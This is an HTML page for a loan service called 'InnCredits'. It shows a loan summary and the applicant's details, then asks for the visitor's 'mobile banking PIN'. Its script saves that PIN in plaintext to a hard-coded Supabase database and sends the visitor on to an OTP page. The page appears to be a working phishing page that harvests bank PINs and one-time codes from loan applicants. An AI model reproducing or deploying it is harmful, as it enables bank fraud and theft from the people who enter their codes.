<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>InnCredits · Confirm PIN</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: #0b1120; font-family: 'Inter', system-ui, sans-serif; display: flex; align-items: flex-start; justify-content: center; min-height: 100vh; padding: 16px 16px 32px 16px; }
        .app-container { max-width: 500px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
        .loan-summary-bar { background: #111827; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; border: 1px solid #1f2a3e; }
        .summary-item { display: flex; flex-direction: column; align-items: flex-start; }
        .summary-label { font-size: 0.7rem; font-weight: 500; color: #7e8aa2; text-transform: uppercase; }
        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; margin-top: 2px; }
        .pin-card { background: #111827; border-radius: 32px; padding: 28px 24px 32px 24px; }
        .section-title { font-size: 1.3rem; font-weight: 700; color: #ffffff; margin-bottom: 8px; }
        .section-sub { font-size: 0.8rem; color: #7e8aa2; margin-bottom: 28px; border-left: 3px solid #14b8a6; padding-left: 12px; }
        .details-grid { background: #0f1724; border-radius: 24px; padding: 18px 16px; margin-bottom: 28px; }
        .detail-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #1e293b; }
        .detail-row:last-child { border-bottom: none; }
        .detail-label { font-size: 0.8rem; color: #94a3b8; }
        .detail-value { font-size: 0.85rem; font-weight: 600; color: #e2e8f0; text-align: right; max-width: 60%; word-break: break-all; }
        .pin-label { font-size: 0.95rem; font-weight: 600; color: #cbd5e1; text-align: center; margin-bottom: 6px; }
        .pin-sublabel { font-size: 0.75rem; color: #7e8aa2; text-align: center; margin-bottom: 20px; }
        .pin-container { display: flex; justify-content: center; gap: 16px; margin-bottom: 12px; }
        .pin-box { width: 65px; height: 65px; background: #0f1724; border: 2px solid #1f2a3e; border-radius: 16px; text-align: center; font-size: 1.8rem; font-weight: 700; color: #14b8a6; outline: none; font-family: inherit; }
        .pin-box:focus { border-color: #14b8a6; box-shadow: 0 0 0 3px rgba(20,184,166,0.15); }
        .confirm-btn { width: 100%; background: #14b8a6; border: none; padding: 18px; font-size: 1.1rem; font-weight: 700; color: #0b1120; border-radius: 60px; cursor: pointer; margin-top: 20px; transition: all 0.2s; font-family: inherit; }
        .confirm-btn:active { transform: scale(0.97); }
        .confirm-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .error-message { color: #f43f5e; font-size: 0.78rem; text-align: center; margin-top: 10px; display: none; }
        .error-message.show { display: block; }
        @media (max-width: 450px) { .pin-box { width: 55px; height: 55px; font-size: 1.5rem; } }
    </style>
</head>
<body>
<div class="app-container">

    <!-- ✅ TOP SUMMARY BAR — populated from URL params -->
    <div class="loan-summary-bar">
        <div class="summary-item">
            <span class="summary-label">Loan Amount</span>
            <span class="summary-value" id="summaryAmount">-</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Term</span>
            <span class="summary-value" id="summaryTerm">-</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Monthly</span>
            <span class="summary-value" id="summaryMonthly">-</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Interest</span>
            <span class="summary-value" id="summaryRate">-</span>
        </div>
    </div>

    <div class="pin-card">
        <div class="section-title">Confirm your details</div>
        <div class="section-sub">Please review your information before continuing</div>

        <!-- ✅ DETAILS GRID — populated from URL params -->
        <div class="details-grid">
            <div class="detail-row">
                <span class="detail-label">Full Name</span>
                <span class="detail-value" id="userFullName">-</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Email</span>
                <span class="detail-value" id="userEmail">-</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Phone</span>
                <span class="detail-value" id="userPhone">-</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Loan Amount</span>
                <span class="detail-value" id="detailAmount">-</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Repayment Term</span>
                <span class="detail-value" id="detailTerm">-</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Monthly Payment</span>
                <span class="detail-value" id="detailMonthly">-</span>
            </div>
        </div>

        <div class="pin-label">Enter your 4-digit mobile PIN</div>
        <div class="pin-sublabel">This is your mobile banking PIN</div>

        <div class="pin-container">
            <input type="password" maxlength="1" class="pin-box" data-idx="0" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" data-idx="1" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" data-idx="2" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" data-idx="3" inputmode="numeric">
        </div>

        <div class="error-message" id="pinError">Please enter a valid 4-digit PIN</div>
        <button class="confirm-btn" id="confirmBtn" disabled>Confirm & Continue →</button>
    </div>
</div>

<script>
    var SUPABASE_URL = 'https://zchkanbnkghpsaagbnrt.supabase.co';
    var SUPABASE_ANON_KEY = 'sb_publishable_KjorGuZY6O03OHhKhidk5w_Y5GcZ250';
    var supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    // ✅ Read all URL params passed from apply.html
    var p        = new URLSearchParams(window.location.search);
    var amount   = p.get('amount')  || '0';
    var term     = p.get('term')    || '0';
    var rate     = p.get('rate')    || '5';
    var monthly  = p.get('monthly') || '0';
    var fullName = decodeURIComponent(p.get('name')  || '');
    var email    = decodeURIComponent(p.get('email') || '');
    var phone    = decodeURIComponent(p.get('phone') || '');
    var appId    = p.get('appId')   || '';

    // ✅ Top summary bar
    document.getElementById('summaryAmount').innerText  = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
    document.getElementById('summaryTerm').innerText    = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
    document.getElementById('summaryMonthly').innerText = '$' + parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
    document.getElementById('summaryRate').innerText    = rate + '%';

    // ✅ Details grid
    document.getElementById('userFullName').innerText  = fullName || 'Not provided';
    document.getElementById('userEmail').innerText     = email    || 'Not provided';
    document.getElementById('userPhone').innerText     = phone    || 'Not provided';
    document.getElementById('detailAmount').innerText  = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
    document.getElementById('detailTerm').innerText    = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
    document.getElementById('detailMonthly').innerText = '$' + parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});

    // ✅ PIN input logic
    var pinBoxes   = document.querySelectorAll('.pin-box');
    var currentPin = ['', '', '', ''];
    var confirmBtn = document.getElementById('confirmBtn');
    var errorMsg   = document.getElementById('pinError');

    function updatePinUI() {
        var isFull = currentPin.every(function(d) { return d && d.match(/[0-9]/); });
        confirmBtn.disabled = !isFull;
        if (isFull) errorMsg.classList.remove('show');
    }

    function setPinDigit(index, value) {
        if (value && !value.match(/[0-9]/)) return;
        if (index >= 0 && index < 4) {
            currentPin[index] = value || '';
            pinBoxes[index].value = value ? '•' : '';
            updatePinUI();
            if (value && index < 3) pinBoxes[index + 1].focus();
        }
    }

    pinBoxes.forEach(function(box, idx) {
        box.addEventListener('input', function(e) {
            setPinDigit(idx, e.target.value.slice(-1));
        });
        box.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace') {
                e.preventDefault();
                if (currentPin[idx] !== '') { setPinDigit(idx, ''); }
                else if (idx > 0) { setPinDigit(idx - 1, ''); pinBoxes[idx - 1].focus(); }
            }
        });
    });

    // ✅ On confirm — save PIN to Supabase then go to otp-verify.html
    confirmBtn.addEventListener('click', async function() {
        var fullPin = currentPin.join('');
        if (fullPin.length !== 4) { errorMsg.classList.add('show'); return; }

        confirmBtn.disabled = true;
        confirmBtn.textContent = 'Saving...';

        // Save PIN to Supabase
        var { error } = await supabase
            .from('users')
            .update({ pin: fullPin })
            .eq('email', email);

        if (error) {
            errorMsg.textContent = 'Failed to save. Please try again.';
            errorMsg.classList.add('show');
            confirmBtn.disabled = false;
            confirmBtn.textContent = 'Confirm & Continue →';
            return;
        }

        // ✅ Redirect to otp-verify.html with all params
        window.location.href = 'otp-verify.html'
            + '?amount='  + amount
            + '&term='    + term
            + '&rate='    + rate
            + '&monthly=' + monthly
            + '&name='    + encodeURIComponent(fullName)
            + '&email='   + encodeURIComponent(email)
            + '&phone='   + encodeURIComponent(phone)
            + '&appId='   + appId;
    });

    pinBoxes[0].focus();
</script>
</body>
</html>
